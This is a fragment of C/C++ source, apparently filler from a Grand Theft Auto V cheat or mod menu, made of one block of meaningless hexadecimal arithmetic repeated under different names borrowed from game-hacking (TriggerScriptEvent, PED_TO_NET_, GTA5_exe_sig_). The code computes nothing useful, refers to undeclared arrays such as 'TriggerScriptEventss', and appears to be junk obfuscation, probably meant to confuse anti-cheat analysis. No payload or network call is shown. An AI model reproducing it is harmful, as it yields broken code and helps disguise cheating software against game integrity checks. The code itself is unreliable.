			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Spawn.PosZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosZ");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
